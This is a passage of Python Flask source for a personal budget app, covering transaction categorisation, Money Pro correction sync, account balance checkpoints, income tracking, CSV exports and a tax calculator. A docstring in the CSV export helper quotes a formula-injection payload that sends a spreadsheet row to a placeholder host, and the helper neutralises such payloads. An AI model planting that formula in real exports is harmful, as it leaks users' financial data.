    tx   = db.execute('SELECT * FROM transactions WHERE id=?', (tid,)).fetchone()
    if not tx:
        return jsonify({'error': 'not found'}), 404

    new_income_cat_id = parse_int(data.get('income_category_id'), 'income_category_id', 1)
    old_income_cat_id = tx['income_category_id']

    if old_income_cat_id:
        bump_income_received(db, old_income_cat_id, tx['month'], tx['year'], -tx['amount'])

    # Assigning an income category makes this row income — say so in tx_type and drop the
    # expense category. Leaving tx_type='Expense' alongside an income_category_id makes the
    # two direction signals disagree, and every consumer picks a different one:
    # balance_delta_since_anchor trusts income_category_id, the budget queries trust tx_type.
    db.execute(
        "UPDATE transactions SET income_category_id=?, tx_type='Income', category_id=NULL WHERE id=?",
        (new_income_cat_id, tid)
    )
    bump_income_received(db, new_income_cat_id, tx['month'], tx['year'], tx['amount'])
    db.commit()
    return jsonify({'ok': True})


@app.route('/check-me')
def check_me_page():
    return render_template('check_me.html', active='/check-me')


@app.route('/api/transactions/<int:tid>/category', methods=['PUT'])
def update_tx_category(tid):
    data = request.json
    db   = get_db()

    tx = db.execute('SELECT * FROM transactions WHERE id=?', (tid,)).fetchone()
    if not tx:
        return jsonify({'error': 'not found'}), 404

    old_cat_id = tx['category_id']
    new_cat_id = parse_int(data.get('category_id'), 'category_id', 1)

    db.execute('UPDATE transactions SET category_id=? WHERE id=?', (new_cat_id, tid))
    db.execute(
        'INSERT INTO corrections (tx_id, old_category_id, new_category_id) VALUES (?, ?, ?)',
        (tid, old_cat_id, new_cat_id)
    )
    db.commit()
    return jsonify({'ok': True})


# ── routes: corrections ───────────────────────────────────────────────────────

@app.route('/api/corrections')
def get_corrections():
    """Returns unsynced corrections as MoneyPro CSV — called by master.py."""
    db     = get_db()
    synced = parse_int(request.args.get('synced', 0), 'synced', 0, 1)
    rows   = db.execute(
        '''SELECT c.id, c.new_category_id, t.date, t.amount, t.account, t.description, t.tx_type
           FROM corrections c
           JOIN transactions t ON c.tx_id = t.id
           WHERE c.synced = ?
           ORDER BY c.created_at''',
        (synced,)
    ).fetchall()

    cat_names = category_name_map(db)

    buf    = io.StringIO()
    writer = csv.writer(buf, delimiter=';')
    writer.writerow(['Date', 'Amount', 'Account', 'Amount received', 'Account (to)',
                     'Balance', 'Category', 'Description', 'Transaction Type',
                     'Agent', 'Check #', 'Class', ''])
    for r in rows:
        cat_name = cat_names.get(r['new_category_id'], 'CHECK ME')
        amount_str = f"{abs(r['amount']):.2f} zł".replace('.', ',')
        writer.writerow([
            r['date'], amount_str, r['account'], '', '', '',
            # tx_type used to be hardcoded 'Expense'. Re-categorising an Income row then
            # round-tripped into Money Pro as an expense of the same amount — the exact
            # direction inversion the "never infer direction from the sign" rule exists
            # to prevent. Money Pro only knows Expense/Income/Money Transfer here.
            cat_name, r['description'],
            r['tx_type'] if r['tx_type'] in ('Expense', 'Income', 'Money Transfer') else 'Expense',
            '', '', '', ''
        ])

    return Response(
        buf.getvalue(),
        mimetype='text/csv',
        headers={'Content-Disposition': 'attachment; filename=corrections.csv',
                 # tells the caller exactly which rows this CSV covers
                 'X-Correction-Ids': ','.join(str(r['id']) for r in rows)}
    )


@app.route('/api/corrections/mark-synced', methods=['POST'])
def mark_corrections_synced():
    """Called by master.py after writing corrections.csv and running learn.

    Takes the explicit ids that were exported. The blanket `WHERE synced=0` raced the
    export window: `learn` can run for minutes, and any correction made on a phone in
    the meantime was flagged synced without ever reaching a CSV — lost, permanently,
    since nothing resets the flag. A bodyless POST also made this the one endpoint a
    plain cross-site <form> could reach."""
    data = request.json or {}
    ids  = data.get('ids')
    db   = get_db()
    if not isinstance(ids, list) or not ids:
        raise BadInput('ids (list of correction ids) is required')
    ids = [parse_int(i, 'correction id', 1) for i in ids]
    placeholders = ','.join('?' for _ in ids)
    cur = db.execute(f'UPDATE corrections SET synced=1 WHERE synced=0 AND id IN ({placeholders})', ids)
    db.commit()
    return jsonify({'ok': True, 'marked': cur.rowcount})


# ── routes: accounts ──────────────────────────────────────────────────────────

def balance_delta_since_anchor(tx_rows, name, anchor, anchor_date=None):
    """Sum of balance changes for account `name` from transactions after its checkpoint.

    `anchor` is a transaction id, i.e. insertion order — not time. Banks post some
    transactions days late, so a charge dated before a manual balance reading can be
    imported after it and arrive with id > anchor. The reading already included it,
    so counting it again puts the balance permanently out by that amount.
    `anchor_date` is the day the checkpoint was taken; anything dated strictly before
    it was already in the figure that was read off the bank.

    ponytail: strictly-before, because dates carry no time. A transaction dated the
    same day as the checkpoint may or may not have been posted when the balance was
    read, so it keeps counting — same behaviour as before. Store a timestamp on the
    checkpoint if same-day double counting ever shows up in practice."""
    delta = 0.0
    for t in tx_rows:
        if t['id'] <= anchor:
            continue
        if anchor_date and t['date'] and t['date'] < anchor_date:
            continue
        if t['tx_type'] == 'Money Transfer':
            if t['account'] == name:
                delta -= t['amount']
            if t['account_to'] == name:
                delta += t['amount']
        elif t['tx_type'] == 'Balance Adjust':
            # Balance Adjust rows are audit entries for manual balance edits —
            # the edit already lands in accounts.balance, so counting the row
            # again would double it. Anchoring normally excludes them; this
            # guard keeps it true even if an anchor is ever reset.
            continue
        elif t['account'] == name:
            is_income = t['income_category_id'] is not None or t['tx_type'] == 'Income'
            delta += t['amount'] if is_income else -t['amount']
    return delta


def txs_after(db, min_anchor):
    return db.execute(
        '''SELECT id, date, account, account_to, tx_type, income_category_id, amount
           FROM transactions WHERE id > ?''',
        (min_anchor,)
    ).fetchall()


@app.route('/api/accounts')
def get_accounts():
    """Displayed balance = accounts.balance (last manual checkpoint) + every
    transaction since (balance_anchor_tx_id) that touches this account."""
    db = get_db()
    accounts = [dict(r) for r in db.execute('SELECT * FROM accounts ORDER BY type, name').fetchall()]
    if not accounts:
        return jsonify([])

    min_anchor = min(a['balance_anchor_tx_id'] or 0 for a in accounts)
    tx_rows = txs_after(db, min_anchor)

    for acc in accounts:
        anchor = acc.pop('balance_anchor_tx_id') or 0
        anchor_date = acc.pop('balance_anchor_date', None)
        delta  = balance_delta_since_anchor(tx_rows, acc['name'], anchor, anchor_date)
        acc['balance'] = round((acc['balance'] or 0) + delta, 2)
        # The frontend never uses the IBAN, and this endpoint needs no auth to reach.
        acc.pop('iban', None)

    return jsonify(accounts)


@app.route('/api/accounts/last-dates')
def accounts_last_dates():
    """Ostatnia data transakcji per konto — używane przez fetcher EB jako
    fallback, gdy brakuje lokalnego stanu last_fetch (np. po reset/migracji)."""
    db = get_db()
    rows = db.execute("SELECT account, date FROM transactions WHERE account != ''").fetchall()
    best = {}
    for r in rows:
        dt = parse_flexible_date(r['date'])
        if dt is None:
            continue
        acct = r['account']
        if acct not in best or dt > best[acct]:
            best[acct] = dt
    return jsonify({acct: dt.strftime('%Y-%m-%d') for acct, dt in best.items()})


@app.route('/api/accounts', methods=['POST'])
def add_account():
    data = request.json
    db   = get_db()
    name = (data.get('name') or '').strip()
    if not name:
        raise BadInput('Account name is required.')
    # Accounts join to transactions by NAME, and an anchor of 0 replays every
    # transaction ever recorded for that name. Delete an account and re-add it and
    # the balance would open with years of history baked in. Anchor to the present.
    last_tx = db.execute('SELECT COALESCE(MAX(id), 0) FROM transactions').fetchone()[0]
    db.execute('''INSERT INTO accounts (name, type, balance, balance_anchor_tx_id, balance_anchor_date)
                  VALUES (?, ?, 0, ?, ?)''',
               (name, data.get('type', 'bank'), last_tx, datetime.now().strftime('%Y-%m-%d')))
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/accounts/<int:aid>', methods=['PUT'])
def update_account(aid):
    data = request.json
    db   = get_db()
    new_balance = parse_money(data.get('balance'), 'balance')
    old = db.execute(
        'SELECT name, balance, balance_anchor_tx_id, balance_anchor_date FROM accounts WHERE id=?',
        (aid,)
    ).fetchone()
    if not old:
        return jsonify({'error': 'not found'}), 404

    # log as special transaction — diff vs the *displayed* balance (checkpoint +
    # transactions since), because that's the number the user just corrected
    anchor = old['balance_anchor_tx_id'] or 0
    displayed = (old['balance'] or 0) + balance_delta_since_anchor(
        txs_after(db, anchor), old['name'], anchor, old['balance_anchor_date'])
    diff = round(new_balance - displayed, 2)
    if diff == 0:
        # Re-saving an unchanged balance used to insert a zero-amount audit row and
        # move the anchor forward, freezing every transaction before it out of the
        # calculation for no reason.
        return jsonify({'ok': True, 'unchanged': True})

    db.execute('UPDATE accounts SET balance=?, updated_at=? WHERE id=?',
               (new_balance, datetime.now().isoformat(), aid))
    sign = '+' if diff >= 0 else '-'
    acct = db.execute('SELECT name FROM accounts WHERE id=?', (aid,)).fetchone()['name']
    cur = db.execute(
        '''INSERT INTO transactions
           (date, amount, account, tx_type, description, month, year)
           VALUES (?, ?, ?, 'Balance Adjust', ?, ?, ?)''',
        (datetime.now().strftime('%Y-%m-%d'), diff, acct,
         f"Edit {sign}{abs(diff):.0f} zł",
         datetime.now().month, datetime.now().year)
    )
    # checkpoint: only transactions after this one should affect the displayed balance.
    # The date matters as much as the id — a transaction imported later but dated
    # before today was already part of the figure just read off the bank.
    db.execute('UPDATE accounts SET balance_anchor_tx_id=?, balance_anchor_date=? WHERE id=?',
               (cur.lastrowid, datetime.now().strftime('%Y-%m-%d'), aid))
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/accounts/<int:aid>', methods=['DELETE'])
def delete_account(aid):
    db = get_db()
    db.execute('DELETE FROM accounts WHERE id=?', (aid,))
    db.commit()
    return jsonify({'ok': True})


# ── routes: income ────────────────────────────────────────────────────────────

# ── routes: income system ─────────────────────────────────────────────────────

@app.route('/income')
def income_page():
    now = datetime.now()
    return render_template('income.html', month=now.month, year=now.year, active='/income')


@app.route('/api/income-categories')
def get_income_categories():
    db = get_db()
    rows = db.execute('SELECT * FROM income_categories ORDER BY sort_order, id').fetchall()
    return jsonify([dict(r) for r in rows])


@app.route('/api/income-categories', methods=['POST'])
def add_income_category():
    data = request.json
    db = get_db()
    max_order = db.execute('SELECT COALESCE(MAX(sort_order)+1,0) FROM income_categories').fetchone()[0]
    db.execute('INSERT INTO income_categories (name, sort_order) VALUES (?, ?)',
               (data['name'], max_order))
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/income-categories/<int:cid>', methods=['DELETE'])
def delete_income_category(cid):
    db = get_db()
    in_use = db.execute('SELECT 1 FROM transactions WHERE income_category_id=? LIMIT 1', (cid,)).fetchone()
    if in_use:
        return jsonify({'error': 'This category has transactions assigned — reassign them first.'}), 400
    db.execute('DELETE FROM income_entries WHERE category_id=?', (cid,))
    db.execute('DELETE FROM income_categories WHERE id=?', (cid,))
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/income-entries')
def get_income_entries():
    month, year = month_year_args()
    db = get_db()
    cats = db.execute('SELECT * FROM income_categories ORDER BY sort_order').fetchall()
    entries = {r['category_id']: dict(r) for r in
               db.execute('SELECT * FROM income_entries WHERE month=? AND year=?', (month, year)).fetchall()}
    result = []
    for cat in cats:
        entry = entries.get(cat['id'], {})
        result.append({
            'category_id': cat['id'],
            'name': cat['name'],
            'planned': entry.get('planned', 0),
            'received': entry.get('received', 0),
            'note': entry.get('note', ''),
        })
    return jsonify(result)


@app.route('/api/income-entries', methods=['PUT'])
def update_income_entry():
    """Partial update: only the fields actually present in the body are written.

    This used to overwrite all three columns from whatever the income page's inputs
    held. `received` is an accumulator maintained by bump_income_received on every
    income transaction — so editing a row's *note* at 09:00 wrote back the stale
    `received` the page had loaded, silently erasing income the 10:30 sync imported."""
    data = request.json or {}
    db = get_db()
    cat_id = parse_int(data.get('category_id'), 'category_id', 1)
    month  = parse_int(data.get('month'), 'month', 1, 12)
    year   = parse_int(data.get('year'), 'year', 1970, 2200)

    updates = {}
    if 'planned' in data:
        updates['planned'] = parse_money(data['planned'], 'planned')
    if 'received' in data:
        updates['received'] = parse_money(data['received'], 'received')
    if 'note' in data:
        updates['note'] = data['note'] or ''
    if not updates:
        return jsonify({'ok': True})

    db.execute(
        '''INSERT INTO income_entries (category_id, month, year, planned, received, note)
           VALUES (?, ?, ?, ?, ?, ?)
           ON CONFLICT(category_id, month, year) DO NOTHING''',
        (cat_id, month, year, updates.get('planned', 0),
         updates.get('received', 0), updates.get('note', ''))
    )
    set_clause = ', '.join(f'{k}=?' for k in updates)
    db.execute(
        f'UPDATE income_entries SET {set_clause} WHERE category_id=? AND month=? AND year=?',
        list(updates.values()) + [cat_id, month, year]
    )
    db.commit()
    return jsonify({'ok': True})


# ── routes: overview (yearly) ─────────────────────────────────────────────────

@app.route('/overview')
def overview_page():
    return render_template('overview.html', year=datetime.now().year, active='/overview')


@app.route('/api/overview')
def api_overview():
    """Yearly matrix: per-month planned/spent/income + per-category monthly spending."""
    year = parse_int(request.args.get('year', datetime.now().year), 'year', 1970, 2200)
    db   = get_db()

    # actual spending per (month, category), expenses only
    rows = db.execute(
        '''SELECT month, category_id, SUM(amount) AS total FROM transactions
           WHERE year=? AND tx_type NOT IN ('Money Transfer', 'Balance Adjust', 'Income')
             AND income_category_id IS NULL
           GROUP BY month, category_id''', (year,)
    ).fetchall()

    # roll child categories up to their parent group
    cats = db.execute('SELECT id, parent_id, name FROM categories').fetchall()
    parent_of = {c['id']: c['parent_id'] or c['id'] for c in cats}
    names     = {c['id']: c['name'] for c in cats if c['parent_id'] is None}

    cat_monthly = {}   # parent_id → [12 floats]
    spent_by_month = [0.0] * 12
    for r in rows:
        pid = parent_of.get(r['category_id'])
        amount = abs(r['total'])
        spent_by_month[r['month'] - 1] += amount
        if pid in names:
            cat_monthly.setdefault(pid, [0.0] * 12)[r['month'] - 1] += amount

    # planned per month = effective BASIC + additionals
    adds = db.execute(
        'SELECT month, SUM(amount) AS total FROM additional_budgets WHERE year=? GROUP BY month',
        (year,)
    ).fetchall()
    adds_by_month = {r['month']: r['total'] for r in adds}
    planned_by_month = []
    for m in range(1, 13):
        basics = get_effective_basics(db, m, year)
        planned_by_month.append(sum(basics.values()) + (adds_by_month.get(m) or 0))

    # income per month (planned + received), with the legacy monthly_income fallback
    inc = {r['month']: r for r in db.execute(
        '''SELECT month, SUM(planned) AS planned, SUM(received) AS received
           FROM income_entries WHERE year=? GROUP BY month''', (year,)).fetchall()}
    legacy = {r['month']: r['amount'] for r in db.execute(
        'SELECT month, amount FROM monthly_income WHERE year=?', (year,)).fetchall()}

    months = []
    for m in range(1, 13):
        planned_income = (inc[m]['planned'] if m in inc else 0) or 0
        if planned_income == 0:
            planned_income = legacy.get(m, 0) or 0
        months.append({
            'month': m,
            'planned': round(planned_by_month[m - 1], 2),
            'spent': round(spent_by_month[m - 1], 2),
            'income_planned': round(planned_income, 2),
            'income_received': round((inc[m]['received'] if m in inc else 0) or 0, 2),
        })

    categories = sorted(
        ({'id': pid, 'name': names[pid],
          'monthly': [round(v, 2) for v in vals], 'total': round(sum(vals), 2)}
         for pid, vals in cat_monthly.items()),
        key=lambda c: -c['total'])

    return jsonify({'year': year, 'months': months, 'categories': categories})


# ── routes: CSV export ────────────────────────────────────────────────────────

def csv_cell(value):
    """Defuse spreadsheet formulas in text columns.

    Transaction descriptions come from the bank, and whoever sends you a transfer
    picks its title. Excel and LibreOffice execute a cell starting with = + - @
    when the export is opened, so a title like `=HYPERLINK("http://x/"&A1,"ok")`
    exfiltrates the row. Leading tab and CR do the same thing in some versions.
    Numbers are formatted separately and never come through here, so quoting a
    leading '-' costs nothing.
    """
    text = '' if value is None else str(value)
    return "'" + text if text[:1] in ('=', '+', '-', '@', '\t', '\r') else text


@app.route('/api/export/transactions.csv')
def export_transactions_csv():
    year  = request.args.get('year')
    month = request.args.get('month')
    db    = get_db()

    q, params = 'SELECT * FROM transactions', []
    if year:
        q += ' WHERE year=?'; params.append(parse_int(year, 'year', 1970, 2200))
        if month:
            q += ' AND month=?'; params.append(parse_int(month, 'month', 1, 12))
    q += ' ORDER BY date, id'
    rows = db.execute(q, params).fetchall()

    cat_names = category_name_map(db)
    income_names = {r['id']: r['name'] for r in db.execute('SELECT id, name FROM income_categories').fetchall()}

    buf = io.StringIO()
    w = csv.writer(buf, delimiter=';')
    w.writerow(['Date', 'Amount', 'Account', 'Account (to)', 'Type', 'Description',
                'Category', 'Income category'])
    for r in rows:
        w.writerow([r['date'], f"{r['amount']:.2f}",
                    csv_cell(r['account']), csv_cell(r['account_to']),
                    csv_cell(r['tx_type']), csv_cell(r['description']),
                    csv_cell(cat_names.get(r['category_id'], '')),
                    csv_cell(income_names.get(r['income_category_id'], ''))])
    suffix = f"-{year}" + (f"-{int(month):02d}" if month else '') if year else ''
    return Response(buf.getvalue(), mimetype='text/csv',
                    headers={'Content-Disposition': f'attachment; filename=money-badger-transactions{suffix}.csv'})


@app.route('/api/export/budget.csv')
def export_budget_csv():
    year = parse_int(request.args.get('year', datetime.now().year), 'year', 1970, 2200)
    db   = get_db()
    cat_names = category_name_map(db)

    spent_rows = db.execute(
        '''SELECT month, category_id, SUM(amount) AS total FROM transactions
           WHERE year=? AND tx_type NOT IN ('Money Transfer', 'Balance Adjust', 'Income')
             AND income_category_id IS NULL AND category_id IS NOT NULL
           GROUP BY month, category_id''', (year,)).fetchall()
    spent = {(r['month'], r['category_id']): abs(r['total']) for r in spent_rows}
    adds_rows = db.execute(
        '''SELECT month, category_id, SUM(amount) AS total FROM additional_budgets
           WHERE year=? GROUP BY month, category_id''', (year,)).fetchall()
    adds = {(r['month'], r['category_id']): r['total'] for r in adds_rows}

    buf = io.StringIO()
    w = csv.writer(buf, delimiter=';')
    w.writerow(['Year', 'Month', 'Category', 'Basic', 'Additional', 'Planned', 'Spent'])
    for m in range(1, 13):
        basics = get_effective_basics(db, m, year)
        cat_ids = sorted(set(basics) | {c for (mm, c) in spent if mm == m} | {c for (mm, c) in adds if mm == m},
                         key=lambda c: cat_names.get(c, ''))
        for cid in cat_ids:
            b = basics.get(cid, 0) or 0
            a = adds.get((m, cid), 0) or 0
            s = spent.get((m, cid), 0) or 0
            if b == 0 and a == 0 and s == 0:
                continue
            w.writerow([year, m, csv_cell(cat_names.get(cid, f'#{cid}')),
                        f'{b:.2f}', f'{a:.2f}', f'{b + a:.2f}', f'{s:.2f}'])
    return Response(buf.getvalue(), mimetype='text/csv',
                    headers={'Content-Disposition': f'attachment; filename=money-badger-budget-{year}.csv'})


# ── routes: calculator ────────────────────────────────────────────────────────

@app.route('/large-expenses')
def large_expenses_page():
    return render_template('large_expenses.html', active='/large-expenses')


@app.route('/api/big-expenses/all')
def get_all_big_expenses():
    db   = get_db()
    rows = db.execute(
        'SELECT * FROM big_expenses ORDER BY year DESC, sort_order, id'
    ).fetchall()

    by_year = {}
    for r in rows:
        y = r['year']
        if y not in by_year:
            by_year[y] = {'year': y, 'items': [], 'total': 0, 'spent': 0}
        by_year[y]['items'].append(dict(r))
        by_year[y]['total'] += r['amount']
        if r['done']:
            by_year[y]['spent'] += r['amount']

    return jsonify(list(by_year.values()))


@app.route('/calculator')
def calculator_page():
    now = datetime.now()
    return render_template('calculator.html', month=now.month, year=now.year, active='/calculator')


@app.route('/api/income-entries/copy-next', methods=['POST'])
def copy_income_entries_next_month():
    """Copies this month's planned income (not received) forward into next month."""
    data  = request.json
    month = parse_int(data.get('month'), 'month', 1, 12)
    year  = parse_int(data.get('year'), 'year', 1970, 2200)
    next_m, next_y = next_month_year(month, year)
    db = get_db()
    entries = db.execute(
        'SELECT category_id, planned, note FROM income_entries WHERE month=? AND year=?', (month, year)
    ).fetchall()
    for e in entries:
        db.execute(
            '''INSERT INTO income_entries (category_id, month, year, planned, received, note)
               VALUES (?, ?, ?, ?, 0, ?)
               ON CONFLICT(category_id, month, year) DO UPDATE SET
                 planned=excluded.planned, note=excluded.note''',
            (e['category_id'], next_m, next_y, e['planned'], e['note'])
        )
    db.commit()
    return jsonify({'ok': True, 'month': next_m, 'year': next_y})


def _rate(value):
    """A blank setting means "not applicable", which is different from a rate of 0."""
    if value is None or str(value).strip() == '':
        return None
    try:
        return float(value)
    except (TypeError, ValueError):
        return None


def _calc_settings(db):
    """Calculator configuration. Everything the old version hardcoded — the tax
    rates and the three destination categories — is a setting here."""
    s = get_settings(db)
    return {
        'enabled': s.get('calc.enabled', '0') == '1',
        'tab_label': s.get('calc.tab_label', 'CALCULATOR'),
        'vat_rate': _rate(s.get('calc.vat_rate')),
        'vat_label': s.get('calc.vat_label', 'VAT'),
        'tax_rate': _rate(s.get('calc.tax_rate')),
        'tax_label': s.get('calc.tax_label', 'TAX'),
        'income_category': s.get('calc.income_category', ''),
        'vat_category': s.get('calc.vat_category', ''),
        'tax_category': s.get('calc.tax_category', ''),
        'month_offset': int(s.get('calc.month_offset', '0') or 0),
        'apply_note': s.get('calc.apply_note', 'Calculator'),
    }


def _calc_totals(db, month, year, cfg):
    """This month's quantities and rates per item, plus adjustments, then the tax split."""
    rows = db.execute(
        """SELECT i.id, i.name, i.unit, i.time_input, i.sort_order,
                  COALESCE(e.qty, 0) AS qty, COALESCE(e.rate, i.rate) AS rate
             FROM calc_items i
             LEFT JOIN calc_entries e
               ON e.item_id = i.id AND e.month = ? AND e.year = ?
            ORDER BY i.sort_order, i.id""", (month, year)).fetchall()
    items = [dict(r) for r in rows]
    for it in items:
        it['total'] = round(it['qty'] * it['rate'], 2)

    rate_by_item = {it['id']: it['rate'] for it in items}
    adjs = [dict(a) for a in db.execute(
        'SELECT * FROM calc_adjustments WHERE month=? AND year=? ORDER BY created_at, id',
        (month, year)).fetchall()]
    for a in adjs:
        a['total'] = round(a['sign'] * a['qty'] * rate_by_item.get(a['item_id'], 0), 2)

    # Rounded on the way out: these are money, and binary floats turn
    # 10000 * 0.085 into 850.0000000000001 on the client's screen.
    subtotal = round(sum(it['total'] for it in items) + sum(a['total'] for a in adjs), 2)
    vat = round(subtotal * cfg['vat_rate'], 2) if cfg['vat_rate'] is not None else None
    tax = round(subtotal * cfg['tax_rate'], 2) if cfg['tax_rate'] is not None else None
    return {
        'items': items,
        'adjustments': adjs,
        'subtotal': subtotal,
        'vat': vat,
        'tax': tax,
        'gross': round(subtotal + (vat or 0), 2),
    }


@app.route('/api/calc')
def get_calc():
    month, year = month_year_args()
    db = get_db()
    cfg = _calc_settings(db)
    return jsonify({'settings': cfg, **_calc_totals(db, month, year, cfg)})


@app.route('/api/calc/items', methods=['POST'])
def add_calc_item():
    data = request.json or {}
    name = (data.get('name') or '').strip()
    if not name:
        return jsonify({'error': 'name is required'}), 400
    db = get_db()
    order = db.execute('SELECT COALESCE(MAX(sort_order)+1, 0) FROM calc_items').fetchone()[0]
    cur = db.execute(
        'INSERT INTO calc_items (name, unit, time_input, rate, sort_order) VALUES (?, ?, ?, ?, ?)',
        (name, (data.get('unit') or '').strip(), 1 if data.get('time_input') else 0,
         parse_money(data.get('rate', 0), 'rate'), order))
    db.commit()
    return jsonify({'ok': True, 'id': cur.lastrowid})


@app.route('/api/calc/items/<int:iid>', methods=['PUT'])
def update_calc_item(iid):
    data = request.json or {}
    db = get_db()
    if not db.execute('SELECT 1 FROM calc_items WHERE id=?', (iid,)).fetchone():
        return jsonify({'error': 'no such item'}), 404
    fields, values = [], []
    for key in ('name', 'unit'):
        if key in data:
            fields.append(key + '=?')
            values.append(str(data[key]).strip())
    if 'time_input' in data:
        fields.append('time_input=?')
        values.append(1 if data['time_input'] else 0)
    if 'rate' in data:
        fields.append('rate=?')
        values.append(parse_money(data['rate'], 'rate'))
    if fields:
        db.execute('UPDATE calc_items SET ' + ', '.join(fields) + ' WHERE id=?', (*values, iid))
        db.commit()
    return jsonify({'ok': True})


@app.route('/api/calc/items/<int:iid>', methods=['DELETE'])
def delete_calc_item(iid):
    db = get_db()
    db.execute('DELETE FROM calc_adjustments WHERE item_id=?', (iid,))
    db.execute('DELETE FROM calc_entries WHERE item_id=?', (iid,))
    db.execute('DELETE FROM calc_items WHERE id=?', (iid,))
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/calc/plan', methods=['PUT'])
def save_calc_plan():
    """Store this month's quantity and rate for each item."""
    data = request.json or {}
    month = parse_int(data.get('month'), 'month', 1, 12)
    year = parse_int(data.get('year'), 'year', 1970, 2200)
    db = get_db()
    for entry in data.get('entries', []):
        item_id = parse_int(entry.get('item_id'), 'item_id', 1)
        if not db.execute('SELECT 1 FROM calc_items WHERE id=?', (item_id,)).fetchone():
            return jsonify({'error': 'no such item: %s' % item_id}), 400
        db.execute(
            """INSERT INTO calc_entries (item_id, month, year, qty, rate) VALUES (?, ?, ?, ?, ?)
               ON CONFLICT(item_id, month, year) DO UPDATE SET
                 qty=excluded.qty, rate=excluded.rate""",
            (item_id, month, year,
             parse_money(entry.get('qty', 0), 'qty'),
             parse_money(entry.get('rate', 0), 'rate')))
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/calc/adjustment', methods=['POST'])
def add_calc_adjustment():
    data = request.json or {}
    db = get_db()
    item_id = parse_int(data.get('item_id'), 'item_id', 1)
    if not db.execute('SELECT 1 FROM calc_items WHERE id=?', (item_id,)).fetchone():
        return jsonify({'error': 'no such item'}), 400
    db.execute(
        'INSERT INTO calc_adjustments (item_id, month, year, sign, qty, description) VALUES (?, ?, ?, ?, ?, ?)',
        (item_id,
         parse_int(data.get('month'), 'month', 1, 12),
         parse_int(data.get('year'), 'year', 1970, 2200),
         1 if data.get('sign', '+') == '+' else -1,
         parse_money(data.get('qty', 0), 'qty'),
         (data.get('description') or '').strip()))
    db.commit()
    return jsonify({'ok': True})


@app.route('/api/calc/adjustment/<int:aid>', methods=['DELETE'])
def delete_calc_adjustment(aid):
    db = get_db()
    db.execute('DELETE FROM calc_adjustments WHERE id=?', (aid,))
    db.commit()
    return jsonify({'ok': True})


def _resolve_expense_category(db, path):
    """Look up "Parent: Child", or a bare name for a top-level category."""
    if not path:
        return None
    if ': ' in path:
        parent, _, child = path.partition(': ')
        row = db.execute(
            """SELECT c.id FROM categories c JOIN categories p ON c.parent_id = p.id
               WHERE p.name=? AND c.name=?""", (parent, child)).fetchone()
    else:
        row = db.execute(
            'SELECT id FROM categories WHERE name=? AND parent_id IS NULL', (path,)).fetchone()
    return row['id'] if row else None


@app.route('/api/calc/apply', methods=['POST'])
def apply_calc():
    """Push the calculated month into the budget: gross as planned income, the two
    tax amounts as additional budgets.

    A category named in the settings but missing from the database is an error.
    The previous version returned ok and silently did nothing, which on screen was
    indistinguishable from success.
    """
    data = request.json or {}
    month = parse_int(data.get('month'), 'month', 1, 12)
    year = parse_int(data.get('year'), 'year', 1970, 2200)
    db = get_db()
    cfg = _calc_settings(db)
    totals = _calc_totals(db, month, year, cfg)

    if not cfg['income_category']:
        return jsonify({'error': 'No income category configured for the calculator'}), 400
    income_cat = db.execute('SELECT id FROM income_categories WHERE name=?',
                            (cfg['income_category'],)).fetchone()
    if not income_cat:
        return jsonify({'error': 'Income category not found: ' + cfg['income_category']}), 400

    note = cfg['apply_note']
    db.execute(
        """INSERT INTO income_entries (category_id, month, year, planned, note)
           VALUES (?, ?, ?, ?, ?)
           ON CONFLICT(category_id, month, year) DO UPDATE SET
             planned=excluded.planned, note=excluded.note""",
        (income_cat['id'], month, year, totals['gross'], note))

    # The EXPENSES summary bar still reads monthly_income.
    db.execute(
        """INSERT INTO monthly_income (month, year, amount, note) VALUES (?, ?, ?, ?)
           ON CONFLICT(month, year) DO UPDATE SET amount=excluded.amount, note=excluded.note""",
        (month, year, totals['gross'], note))

    for amount, path in ((totals['vat'], cfg['vat_category']),
                         (totals['tax'], cfg['tax_category'])):
        if amount is None or not path:
            continue
        cat_id = _resolve_expense_category(db, path)
        if cat_id is None:
            return jsonify({'error': 'Expense category not found: ' + path}), 400
        db.execute(
            """DELETE FROM additional_budgets
               WHERE category_id=? AND month=? AND year=? AND description=?""",
            (cat_id, month, year, note))
        if round(amount) > 0:
            db.execute(
                """INSERT INTO additional_budgets (category_id, amount, description, month, year)
                   VALUES (?, ?, ?, ?, ?)""",
                (cat_id, round(amount), note, month, year))

    db.commit()
    return jsonify({'ok': True, 'gross': totals['gross'],
                    'vat': totals['vat'], 'tax': totals['tax']})


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5055, debug=False)
